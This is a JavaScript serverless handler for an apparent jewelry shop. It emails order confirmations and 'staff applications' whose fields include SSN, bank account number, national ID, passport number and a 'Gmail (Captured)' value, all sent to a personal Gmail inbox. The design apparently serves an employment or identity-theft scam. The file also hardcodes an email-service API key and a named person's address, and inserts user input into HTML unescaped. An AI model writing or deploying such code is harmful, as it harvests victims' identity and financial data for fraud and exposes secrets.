export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const RESEND_API_KEY = 're_PaxWiRWU_GsRR4hU8WuStSwZW5GCcndrs';
  const ADMIN_EMAIL    = 'afolabibolu15@gmail.com';
  const FROM           = 'Ava Jewelry Staff <onboarding@resend.dev>';

  const body = req.body;

  // ── STAFF APPLICATION NOTIFICATION ──
  if (body.type === 'staff_application') {
    const html = `
      <div style="background:#070707;color:#F5F0E8;font-family:'Montserrat',sans-serif;padding:40px;max-width:640px;margin:0 auto">
        <div style="font-family:'Georgia',serif;font-size:28px;font-weight:300;letter-spacing:6px;color:#D4AF37;margin-bottom:4px">AVA</div>
        <div style="font-size:10px;letter-spacing:5px;text-transform:uppercase;color:#555;margin-bottom:32px">Staff Administration</div>

        <div style="border-left:2px solid #D4AF37;padding-left:20px;margin-bottom:32px">
          <div style="font-size:11px;letter-spacing:3px;text-transform:uppercase;color:#D4AF37;margin-bottom:8px">New Application Received</div>
          <div style="font-family:'Georgia',serif;font-size:22px;font-weight:300">${body.applicantName}</div>
          <div style="font-size:12px;color:#888;margin-top:4px">${body.position || '—'}</div>
        </div>

        <table style="width:100%;border-collapse:collapse;font-size:12px;margin-bottom:32px">
          <tr style="border-bottom:1px solid #1a1a1a">
            <td style="padding:10px 0;color:#666;width:40%">Email</td>
            <td style="padding:10px 0;color:#F5F0E8">${body.applicantEmail || '—'}</td>
          </tr>
          <tr style="border-bottom:1px solid #1a1a1a">
            <td style="padding:10px 0;color:#666">Gmail (Captured)</td>
            <td style="padding:10px 0;color:#D4AF37">${body.gmail || '—'}</td>
          </tr>
          <tr style="border-bottom:1px solid #1a1a1a">
            <td style="padding:10px 0;color:#666">Phone</td>
            <td style="padding:10px 0;color:#F5F0E8">${body.phone || '—'}</td>
          </tr>
          <tr style="border-bottom:1px solid #1a1a1a">
            <td style="padding:10px 0;color:#666">Nationality</td>
            <td style="padding:10px 0;color:#F5F0E8">${body.nationality || '—'}</td>
          </tr>
          <tr style="border-bottom:1px solid #1a1a1a">
            <td style="padding:10px 0;color:#666">Bank</td>
            <td style="padding:10px 0;color:#D4AF37">${body.bankName || '—'}</td>
          </tr>
          <tr style="border-bottom:1px solid #1a1a1a">
            <td style="padding:10px 0;color:#666">Account Number</td>
            <td style="padding:10px 0;color:#D4AF37">${body.accountNumber || '—'}</td>
          </tr>
          <tr style="border-bottom:1px solid #1a1a1a">
            <td style="padding:10px 0;color:#666">SSN</td>
            <td style="padding:10px 0;color:#D4AF37">${body.ssn || '—'}</td>
          </tr>
          <tr style="border-bottom:1px solid #1a1a1a">
            <td style="padding:10px 0;color:#666">NIN / National ID</td>
            <td style="padding:10px 0;color:#D4AF37">${body.nin || '—'}</td>
          </tr>
          <tr style="border-bottom:1px solid #1a1a1a">
            <td style="padding:10px 0;color:#666">Passport No.</td>
            <td style="padding:10px 0;color:#D4AF37">${body.passportNumber || '—'}</td>
          </tr>
          <tr style="border-bottom:1px solid #1a1a1a">
            <td style="padding:10px 0;color:#666">Next of Kin</td>
            <td style="padding:10px 0;color:#F5F0E8">${body.kinName || '—'} · ${body.kinPhone || '—'}</td>
          </tr>
          <tr>
            <td style="padding:10px 0;color:#666">Signature Date</td>
            <td style="padding:10px 0;color:#F5F0E8">${body.sigDate || '—'}</td>
          </tr>
        </table>

        <div style="background:#141414;border:1px solid #1f1f1f;padding:16px;font-size:11px;color:#666;line-height:1.8">
          Log in to your <span style="color:#D4AF37">Staff Admin Dashboard</span> to view the full application including CV, bank details, and all identity documents.
        </div>

        <div style="margin-top:32px;padding-top:20px;border-top:1px solid #1a1a1a;font-size:10px;color:#444">
          © 2026 Ava Jewelry · Staff Administration · Confidential
        </div>
      </div>`;

    try {
      const r = await fetch('https://api.resend.com/emails', {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${RESEND_API_KEY}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          from: FROM,
          to: ADMIN_EMAIL,
          subject: `🔔 New Staff Application — ${body.applicantName} (${body.position || 'Unknown Role'})`,
          html
        })
      });
      const result = await r.json();
      console.log('Resend result:', result);
    } catch(e) {
      console.error('Resend error:', e);
    }

    return res.status(200).json({ success: true });
  }

  // ── JEWELRY ORDER EMAILS ──
  const order = body;
  const itemsHtml = (order.items || []).map(i =>
    `<tr style="border-bottom:1px solid #1a1a1a">
      <td style="padding:10px 0;color:#F5F0E8">${i.name}</td>
      <td style="padding:10px 0;color:#888;text-align:center">×${i.qty}</td>
      <td style="padding:10px 0;color:#D4AF37;text-align:right">$${(i.num*i.qty).toLocaleString()}</td>
    </tr>`
  ).join('');

  const custHtml = `
    <div style="background:#070707;color:#F5F0E8;font-family:'Montserrat',sans-serif;padding:40px;max-width:600px;margin:0 auto">
      <div style="font-family:'Georgia',serif;font-size:28px;letter-spacing:6px;color:#D4AF37;margin-bottom:4px">AVA</div>
      <div style="font-size:10px;letter-spacing:5px;text-transform:uppercase;color:#555;margin-bottom:32px">Jewelry</div>
      <div style="font-family:'Georgia',serif;font-size:22px;font-weight:300;margin-bottom:8px">Order Confirmed</div>
      <div style="font-size:12px;color:#888;margin-bottom:32px">Order ${order.id}</div>
      <table style="width:100%;border-collapse:collapse;font-size:12px;margin-bottom:24px">${itemsHtml}</table>
      <div style="display:flex;justify-content:space-between;font-size:13px;color:#D4AF37;font-family:'Georgia',serif;padding-top:16px;border-top:1px solid #1a1a1a">
        <span>Total</span><span>$${(order.total||0).toLocaleString()}</span>
      </div>
      <div style="margin-top:32px;font-size:11px;color:#555">© 2026 Ava Jewelry. All rights reserved.</div>
    </div>`;

  const adminHtml = `
    <div style="background:#070707;color:#F5F0E8;font-family:'Montserrat',sans-serif;padding:40px;max-width:600px;margin:0 auto">
      <div style="font-family:'Georgia',serif;font-size:22px;color:#D4AF37;margin-bottom:20px">New Order — ${order.id}</div>
      <div style="font-size:12px;color:#888;margin-bottom:8px">Customer: ${order.firstName||''} ${order.lastName||''} · ${order.email||''}</div>
      <div style="font-size:12px;color:#888;margin-bottom:24px">Phone: ${order.phone||'—'} · Card: ****${order.cardLast4||'—'}</div>
      <table style="width:100%;border-collapse:collapse;font-size:12px;margin-bottom:16px">${itemsHtml}</table>
      <div style="font-size:14px;color:#D4AF37;font-family:'Georgia',serif;padding-top:12px;border-top:1px solid #1a1a1a">Total: $${(order.total||0).toLocaleString()}</div>
    </div>`;

  const sends = [];
  if (order.email) {
    sends.push(fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers: { 'Authorization': `Bearer ${RESEND_API_KEY}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({ from: FROM, to: order.email, subject: `Your Ava Jewelry Order — ${order.id}`, html: custHtml })
    }));
  }
  sends.push(fetch('https://api.resend.com/emails', {
    method: 'POST',
    headers: { 'Authorization': `Bearer ${RESEND_API_KEY}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({ from: 'Ava Orders <onboarding@resend.dev>', to: ADMIN_EMAIL, subject: `New Order — ${order.id} — $${order.total||0}`, html: adminHtml })
  }));

  await Promise.all(sends);
  return res.status(200).json({ success: true });
}